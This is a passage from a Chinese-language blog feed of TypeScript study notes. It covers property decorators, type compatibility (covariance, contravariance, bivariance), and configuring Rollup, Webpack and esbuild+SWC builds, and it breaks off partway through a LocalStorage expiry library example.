class="built_in">any</span></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(data)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="属性装饰器"><a href="#属性装饰器" class="headerlink" title="属性装饰器"></a>属性装饰器</h1><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// target：原型对象   key：属性名</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Name</span>:<span class="title class_">PropertyDecorator</span> = <span class="function">(<span class="params">target,key</span>)=&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(target,key)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Http</span> &#123;</span><br><span class="line">  <span class="meta">@Name</span></span><br><span class="line">  <span class="attr">yajue</span>:<span class="built_in">string</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">yajue:<span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">yajue</span> = yajue</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>TypeScript</tag>
      </tags>
  </entry>
  <entry>
    <title>类型兼容</title>
    <url>/web/study/TypeScript/22.%E7%B1%BB%E5%9E%8B%E5%85%BC%E5%AE%B9.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1wR4y1377K?vd_source=abff2190dd215e2033f2ec57123dd1d6">小满TypeScript基础教程全集（完结）</a></p>
<p>所谓类型兼容性，就是用于确定一个类型是否能赋值给其他的类型</p>
<p>TS中的类型兼容性是基于结构类型的（也就是形状），如果A要兼容B，那么A至少具有和B相同的属性</p>
<h1 id="协变"><a href="#协变" class="headerlink" title="协变"></a>协变</h1><p>又称鸭子类型</p>
<p>一只鸟，走路像鸭子，游泳也像鸭子，做什么都像鸭子，但它并不是鸭子，那么这只鸟就可以成为鸭子类型</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> A &#123;</span><br><span class="line">  <span class="attr">name</span>:<span class="built_in">string</span></span><br><span class="line">  <span class="attr">age</span>:<span class="built_in">number</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// B类型有着A类型的所有属性</span></span><br><span class="line"><span class="keyword">interface</span> B &#123;</span><br><span class="line">  <span class="attr">name</span>:<span class="built_in">string</span></span><br><span class="line">  <span class="attr">age</span>:<span class="built_in">number</span></span><br><span class="line">  <span class="attr">gender</span>:<span class="built_in">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="attr">a</span>:A = &#123;</span><br><span class="line">  <span class="attr">name</span>:<span class="string">&quot;yajue&quot;</span>,</span><br><span class="line">  <span class="attr">age</span>:<span class="number">24</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> <span class="attr">b</span>:B = &#123;</span><br><span class="line">  <span class="attr">name</span>:<span class="string">&quot;snnn&quot;</span>,</span><br><span class="line">  <span class="attr">age</span>:<span class="number">30</span>,</span><br><span class="line">  <span class="attr">gender</span>:<span class="string">&quot;女&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// b = a     // 不OK</span></span><br><span class="line">a = b       <span class="comment">// OK，产生了协变（类似java的多态）</span></span><br></pre></td></tr></table></figure>

<h1 id="逆变"><a href="#逆变" class="headerlink" title="逆变"></a>逆变</h1><p>逆变通常发生于函数的参数</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> A &#123;</span><br><span class="line">  <span class="attr">name</span>:<span class="built_in">string</span></span><br><span class="line">  <span class="attr">age</span>:<span class="built_in">number</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// B类型有着A类型的所有属性</span></span><br><span class="line"><span class="keyword">interface</span> B &#123;</span><br><span class="line">  <span class="attr">name</span>:<span class="built_in">string</span></span><br><span class="line">  <span class="attr">age</span>:<span class="built_in">number</span></span><br><span class="line">  <span class="attr">gender</span>:<span class="built_in">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="title function_">fna</span> = (<span class="params">param:A</span>)=&gt; &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> <span class="title function_">fnb</span> = (<span class="params">param:B</span>)=&gt; &#123;&#125;</span><br><span class="line"><span class="comment">// fna = fnb   // 不OK</span></span><br><span class="line">fnb = fna     <span class="comment">// OK，产生了逆变</span></span><br><span class="line"><span class="comment">// 虽然fnb的参数类型是B，实际上执行的是fna的函数体</span></span><br><span class="line"><span class="comment">// 在函数体中使用所有A类型的属性都是安全的，反之不安全</span></span><br><span class="line"><span class="title function_">fnb</span>()</span><br></pre></td></tr></table></figure>

<h1 id="双向协变"><a href="#双向协变" class="headerlink" title="双向协变"></a>双向协变</h1><p>在tsconfig.json中设置</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;strictFunctionTypes&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br></pre></td></tr></table></figure>

<p>开启后：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> A &#123;</span><br><span class="line">  <span class="attr">name</span>:<span class="built_in">string</span></span><br><span class="line">  <span class="attr">age</span>:<span class="built_in">number</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// B类型有着A类型的所有属性</span></span><br><span class="line"><span class="keyword">interface</span> B &#123;</span><br><span class="line">  <span class="attr">name</span>:<span class="built_in">string</span></span><br><span class="line">  <span class="attr">age</span>:<span class="built_in">number</span></span><br><span class="line">  <span class="attr">gender</span>:<span class="built_in">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="attr">a</span>:A = &#123;</span><br><span class="line">  <span class="attr">name</span>:<span class="string">&quot;yajue&quot;</span>,</span><br><span class="line">  <span class="attr">age</span>:<span class="number">24</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> <span class="attr">b</span>:B = &#123;</span><br><span class="line">  <span class="attr">name</span>:<span class="string">&quot;snnn&quot;</span>,</span><br><span class="line">  <span class="attr">age</span>:<span class="number">30</span>,</span><br><span class="line">  <span class="attr">gender</span>:<span class="string">&quot;女&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// b = a     // 照样不OK</span></span><br><span class="line">a = b     <span class="comment">// OK</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="title function_">fna</span> = (<span class="params">param:A</span>)=&gt; &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> <span class="title function_">fnb</span> = (<span class="params">param:B</span>)=&gt; &#123;&#125;</span><br><span class="line">fna = fnb     <span class="comment">// OK</span></span><br><span class="line">fnb = fna     <span class="comment">// OK</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>TypeScript</tag>
      </tags>
  </entry>
  <entry>
    <title>构建TS项目</title>
    <url>/web/study/TypeScript/21.%E6%9E%84%E5%BB%BATS%E9%A1%B9%E7%9B%AE.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1wR4y1377K?vd_source=abff2190dd215e2033f2ec57123dd1d6">小满TypeScript基础教程全集（完结）</a></p>
<h1 id="Rollup构建"><a href="#Rollup构建" class="headerlink" title="Rollup构建"></a>Rollup构建</h1><p>Rollup打包后的体积较小，可以做一些小框架、小项目</p>
<h2 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h2><ol>
<li><p>全局安装rollup</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install rollup -g</span><br></pre></td></tr></table></figure>
</li>
<li><p>安装TypeScript</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install typescript -D</span><br></pre></td></tr></table></figure>
</li>
<li><p>安装TypeScript 转换器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install rollup-plugin-typescript2 -D</span><br></pre></td></tr></table></figure>
</li>
<li><p>安装代码压缩插件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install rollup-plugin-terser -D</span><br></pre></td></tr></table></figure>
</li>
<li><p>安装rollupweb服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install rollup-plugin-serve -D</span><br></pre></td></tr></table></figure>
</li>
<li><p>安装热更新</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install rollup-plugin-livereload -D</span><br></pre></td></tr></table></figure>
</li>
<li><p>引入外部依赖</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install rollup-plugin-node-resolve -D</span><br></pre></td></tr></table></figure>
</li>
<li><p>安装配置环境变量用来区分本地和生产</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install cross-env -D</span><br></pre></td></tr></table></figure>
</li>
<li><p>替换环境变量给浏览器使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install rollup-plugin-replace -D</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><p>rollup.config.js：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ts <span class="keyword">from</span> <span class="string">&quot;rollup-plugin-typescript2&quot;</span>    <span class="comment">// 让rollup能够识别TS</span></span><br><span class="line"><span class="keyword">import</span> serve <span class="keyword">from</span> <span class="string">&quot;rollup-plugin-serve&quot;</span>       <span class="comment">// 启动前端服务</span></span><br><span class="line"><span class="keyword">import</span> livereload <span class="keyword">from</span> <span class="string">&quot;rollup-plugin-livereload&quot;</span>   <span class="comment">// 服务热更新</span></span><br><span class="line"><span class="keyword">import</span> &#123; terser &#125; <span class="keyword">from</span> <span class="string">&quot;rollup-plugin-terser&quot;</span>       <span class="comment">// 代码压缩</span></span><br><span class="line"><span class="keyword">import</span> replace <span class="keyword">from</span> <span class="string">&quot;rollup-plugin-replace&quot;</span>         <span class="comment">// 向浏览器环境注入变量</span></span><br><span class="line"><span class="comment">// ES6模块下获取绝对路径的方式</span></span><br><span class="line"><span class="keyword">import</span> path <span class="keyword">from</span> <span class="string">&quot;path&quot;</span></span><br><span class="line"><span class="keyword">import</span> &#123; fileURLToPath &#125; <span class="keyword">from</span> <span class="string">&quot;url&quot;</span></span><br><span class="line"><span class="keyword">const</span> metaUrl = <span class="title function_">fileURLToPath</span>(<span class="keyword">import</span>.<span class="property">meta</span>.<span class="property">url</span>)</span><br><span class="line"><span class="keyword">const</span> dirName = path.<span class="title function_">dirname</span>(metaUrl)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检测目前是否处于开发环境</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">isDev</span> = (<span class="params"></span>)=&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> process.<span class="property">env</span>.<span class="property">NODE_ENV</span> === <span class="string">&quot;development&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="attr">input</span>: <span class="string">&quot;./src/index.ts&quot;</span>,    <span class="comment">// 入口</span></span><br><span class="line">  <span class="attr">output</span>: &#123;                   <span class="comment">// 出口</span></span><br><span class="line">    <span class="attr">file</span>: path.<span class="title function_">resolve</span>(dirName,<span class="string">&quot;./lib/index.js&quot;</span>),</span><br><span class="line">    <span class="attr">format</span>: <span class="string">&quot;umd&quot;</span>,</span><br><span class="line">    <span class="attr">sourcemap</span>: <span class="literal">true</span></span><br><span class="line">  &#125;,</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  <span class="attr">plugins</span>:[</span><br><span class="line">    <span class="title function_">ts</span>(),</span><br><span class="line">    <span class="title function_">isDev</span>() &amp;&amp; <span class="title function_">livereload</span>(),      <span class="comment">// 如果是开发环境，打开服务，否则不打开</span></span><br><span class="line">    <span class="title function_">terser</span>(),</span><br><span class="line">    <span class="title function_">replace</span>(&#123;</span><br><span class="line">      <span class="string">&quot;process.env.NODE_ENV&quot;</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(process.<span class="property">env</span>.<span class="property">NODE_ENV</span>)</span><br><span class="line">    &#125;),</span><br><span class="line">    <span class="title function_">isDev</span>() &amp;&amp; <span class="title function_">serve</span>(&#123;                    </span><br><span class="line">      <span class="attr">open</span>: <span class="literal">true</span>,                         <span class="comment">// 自动打开网页</span></span><br><span class="line">      <span class="attr">port</span>: <span class="number">11451</span>,                        <span class="comment">// 服务端口</span></span><br><span class="line">      <span class="attr">openPage</span>: <span class="string">&quot;/public/index.html&quot;</span>      <span class="comment">// 打开的文件</span></span><br><span class="line">    &#125;)</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>package.json：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;test2&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;main&quot;</span><span class="punctuation">:</span> <span class="string">&quot;index.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;module&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;test&quot;</span><span class="punctuation">:</span> <span class="string">&quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="comment">// --bundleConfigAsCjs：强制将配置转译为CommonJS</span></span><br><span class="line">    <span class="comment">// 即使配置本身是作为ES模块编写的，也可以使用CommonJS常用的方法</span></span><br><span class="line">    <span class="attr">&quot;dev&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cross-env NODE_ENV=development  rollup -c -w&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;build&quot;</span><span class="punctuation">:</span><span class="string">&quot;cross-env NODE_ENV=produaction rollup -c&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;keywords&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;author&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;license&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ISC&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;devDependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;cross-env&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^7.0.3&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;rollup-plugin-livereload&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^2.0.5&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;rollup-plugin-node-resolve&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^5.2.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;rollup-plugin-replace&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^2.2.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;rollup-plugin-serve&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^1.1.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;rollup-plugin-terser&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^7.0.2&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;rollup-plugin-typescript2&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^0.31.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;typescript&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^4.5.5&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>设置tsconfig.json：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;sourceMap&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br></pre></td></tr></table></figure>

<h1 id="Webpack构建"><a href="#Webpack构建" class="headerlink" title="Webpack构建"></a>Webpack构建</h1><h2 id="安装依赖-1"><a href="#安装依赖-1" class="headerlink" title="安装依赖"></a>安装依赖</h2><ol>
<li><p>安装webpack </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install webpack -D</span><br></pre></td></tr></table></figure>
</li>
<li><p>webpack4以上需要</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install  webpack-cli -D</span><br></pre></td></tr></table></figure>
</li>
<li><p>编译TS</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install ts-loader -D</span><br></pre></td></tr></table></figure>
</li>
<li><p>TS环境</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install typescript -D</span><br></pre></td></tr></table></figure>
</li>
<li><p>热更新服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install  webpack-dev-server -D</span><br></pre></td></tr></table></figure>
</li>
<li><p>HTML模板</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install html-webpack-plugin -D</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="配置文件-1"><a href="#配置文件-1" class="headerlink" title="配置文件"></a>配置文件</h2><p>webpack.config.js：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">HtmlWebpackPlugin</span> = <span class="built_in">require</span>(<span class="string">&quot;html-webpack-plugin&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">entry</span>: <span class="string">&quot;./src/index.ts&quot;</span>,      <span class="comment">// 入口</span></span><br><span class="line">  <span class="attr">output</span>: &#123;                     <span class="comment">// 出口</span></span><br><span class="line">    <span class="attr">path</span>: path.<span class="title function_">resolve</span>(__dirname,<span class="string">&quot;./dist&quot;</span>),</span><br><span class="line">    <span class="attr">filename</span>: <span class="string">&quot;index.js&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">module</span>: &#123;</span><br><span class="line">    <span class="attr">rules</span>: [          <span class="comment">// 使用loader</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">test</span>: <span class="regexp">/\.ts$/</span>,    <span class="comment">// 正则匹配文件类型</span></span><br><span class="line">        <span class="attr">use</span>:<span class="string">&quot;ts-loader&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">devServer</span>: &#123;</span><br><span class="line">    <span class="attr">port</span>: <span class="number">11451</span>,      <span class="comment">// 服务端口号</span></span><br><span class="line">    <span class="attr">proxy</span>: &#123;          <span class="comment">// 跨域</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">resolve</span>: &#123;</span><br><span class="line">    <span class="attr">extensions</span>: [<span class="string">&quot;.js&quot;</span>,<span class="string">&quot;.ts&quot;</span>]     <span class="comment">// import时无需再写后缀</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">plugins</span>: [          <span class="comment">// 插件</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">HtmlWebpackPlugin</span>(&#123;       <span class="comment">// 指定html模板</span></span><br><span class="line">      <span class="attr">template</span>: <span class="string">&quot;./public/index.html&quot;</span></span><br><span class="line">    &#125;)</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">mode</span>: <span class="string">&quot;development&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="esbuild-SWC构建"><a href="#esbuild-SWC构建" class="headerlink" title="esbuild+SWC构建"></a>esbuild+SWC构建</h1><h2 id="esbuild"><a href="#esbuild" class="headerlink" title="esbuild"></a>esbuild</h2><p>esbuild使用go语言编写，多线程执行，性能是js的好几十倍，所以很快</p>
<p>esbuild的优点：</p>
<ul>
<li>无需缓存即可实现基础打包</li>
<li>支持ES6跟CommonJS 模块</li>
<li>支持ES6 Tree Shaking</li>
<li>体积小</li>
<li>插件化</li>
<li>其他</li>
<li>内置支持编译jsx</li>
</ul>
<p>Vite的开发模式基于esbuild</p>
<h2 id="SWC"><a href="#SWC" class="headerlink" title="SWC"></a>SWC</h2><p>SWC是用Rust写的，所实现的功能跟babel一样（es6语法转es5），但是速度比babel更快</p>
<h2 id="安装依赖-2"><a href="#安装依赖-2" class="headerlink" title="安装依赖"></a>安装依赖</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install @swc/core esbuild @swc/helpers</span><br></pre></td></tr></table></figure>

<p>如果项目需要支持JSX或TSX，安装@swc&#x2F;helpers，否则无需安装</p>
<h2 id="配置文件-2"><a href="#配置文件-2" class="headerlink" title="配置文件"></a>配置文件</h2><p>设置tsconfig.json：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;target&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ESNext&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;module&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ESNext&quot;</span><span class="punctuation">,</span> </span><br><span class="line"><span class="attr">&quot;moduleResolution&quot;</span><span class="punctuation">:</span> <span class="string">&quot;node&quot;</span></span><br></pre></td></tr></table></figure>

<p>设置package.json：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;module&quot;</span></span><br></pre></td></tr></table></figure>

<p>config.ts：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> esbuild <span class="keyword">from</span> <span class="string">&quot;esbuild&quot;</span></span><br><span class="line"><span class="keyword">import</span> swc <span class="keyword">from</span> <span class="string">&quot;@swc/core&quot;</span></span><br><span class="line"><span class="keyword">import</span> fs <span class="keyword">from</span> <span class="string">&quot;node:fs&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 打包的方法，它是个异步方法</span></span><br><span class="line"><span class="keyword">await</span> esbuild.<span class="title function_">build</span>(&#123;</span><br><span class="line">  <span class="attr">entryPoints</span>: [<span class="string">&quot;index.ts&quot;</span>],      <span class="comment">// 入口</span></span><br><span class="line">  <span class="attr">treeShaking</span>: <span class="literal">true</span>,              <span class="comment">// 抖树</span></span><br><span class="line">  <span class="attr">bundle</span>: <span class="literal">true</span>,                   <span class="comment">// 独立打包</span></span><br><span class="line">  <span class="attr">loader</span>: &#123;                       <span class="comment">// loader，后缀名: loader名</span></span><br><span class="line">    <span class="string">&quot;.js&quot;</span>: <span class="string">&quot;js&quot;</span>,</span><br><span class="line">    <span class="string">&quot;.ts&quot;</span>: <span class="string">&quot;ts&quot;</span>,</span><br><span class="line">    <span class="string">&quot;.jsx&quot;</span>: <span class="string">&quot;jsx&quot;</span>,</span><br><span class="line">    <span class="string">&quot;.tsx&quot;</span>: <span class="string">&quot;tsx&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">plugins</span>: [                      <span class="comment">// 插件</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&quot;swc-loader&quot;</span>,</span><br><span class="line">      <span class="comment">// 使用swc</span></span><br><span class="line">      <span class="title function_">setup</span>(<span class="params">build</span>) &#123;</span><br><span class="line">        <span class="comment">// args：当前模块的信息</span></span><br><span class="line">        build.<span class="title function_">onLoad</span>(&#123;<span class="attr">filter</span>:<span class="regexp">/\.(js|ts|jsx|tsx)$/</span>&#125;,<span class="function">(<span class="params">args</span>)=&gt;</span>&#123;</span><br><span class="line">          <span class="comment">// 取到了文件里的ts代码</span></span><br><span class="line">          <span class="keyword">const</span> content = fs.<span class="title function_">readFileSync</span>(args.<span class="property">path</span>, <span class="string">&quot;utf-8&quot;</span>) </span><br><span class="line">          <span class="comment">// 用swc转换代码，能得到转换后的代码和sourceMap</span></span><br><span class="line">          <span class="keyword">const</span> &#123;code, map&#125; = swc.<span class="title function_">transformSync</span>(content, &#123;</span><br><span class="line">            <span class="attr">filename</span>: args.<span class="property">path</span></span><br><span class="line">          &#125;)</span><br><span class="line">          <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="attr">contents</span>: code		  <span class="comment">// 返回转换后的代码</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">outdir</span>: <span class="string">&quot;dist&quot;</span> ,                <span class="comment">// 出口 </span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>打包命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ts-node-esm config.ts</span><br></pre></td></tr></table></figure>

<h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><p>打包工具配置(rollup.config.js)：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ts <span class="keyword">from</span> <span class="string">&quot;rollup-plugin-typescript2&quot;</span></span><br><span class="line"><span class="keyword">import</span> path <span class="keyword">from</span> <span class="string">&quot;path&quot;</span></span><br><span class="line"><span class="keyword">import</span> &#123; fileURLToPath &#125; <span class="keyword">from</span> <span class="string">&quot;url&quot;</span></span><br><span class="line"><span class="keyword">const</span> metaUrl = <span class="title function_">fileURLToPath</span>(<span class="keyword">import</span>.<span class="property">meta</span>.<span class="property">url</span>)</span><br><span class="line"><span class="keyword">const</span> dirName = path.<span class="title function_">dirname</span>(metaUrl)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="attr">input</span>: <span class="string">&quot;./src/index.ts&quot;</span>,</span><br><span class="line">  <span class="attr">output</span>: &#123;</span><br><span class="line">    <span class="attr">file</span>: path.<span class="title function_">resolve</span>(dirName,<span class="string">&quot;./dist/index.js&quot;</span>),</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">plugins</span>:[</span><br><span class="line">    <span class="title function_">ts</span>(),</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="LocalStorage过期实例"><a href="#LocalStorage过期实例" class="headerlink" title="LocalStorage过期实例"></a>LocalStorage过期实例</h2><p>该库提供将LocalStorage像Cookie一样可限时存储的功能</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202307211352521.png" alt="目录"></p>
<p>定义字符串枚举(&#x2F;src&#x2F;enum&#x2F;index.ts)：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">enum</span> <span class="title class_">Dictionaries</span> &#123;</span><br><span class="line">  permanent = <span class="string">&quot;permanent&quot;</span>,</span><br><span class="line">  expire = <span class="string">&quot;__expire__&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>定义类型(&#x2F;src&#x2F;type&#x2F;index.ts)：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Dictionaries</span> &#125; <span class="keyword">from</span> <span class="string">&quot;../enum&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">type</span> <span class="title class_">Key</span> = <span class="built_in">string</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">type</span> <span class="title class_">Expire</span> = <span class="title class_">Dictionaries</span>.<span class="property">permanent</span> | <span class="built_in">number</span>  <span class="comment">// number指时间戳</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">interface</span> <span class="title class_">Data</span>&lt;T&gt; &#123;</span><br><span class="line">  <span class="attr">value</span>:T,</span><br><span class="line">  [<span class="title class_">Dictionaries</span>.<span class="property">expire</span>]:<span class="title class_">Expire</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">interface</span> <span class="title class_">Result</span>&lt;T&gt; &#123;</span><br><span class="line">  <span class="attr">message</span>:<span class="built_in">string</span>,</span><br><span class="line">  <span class="attr">value</span>:T|<span class="literal">null</span></span><br><span 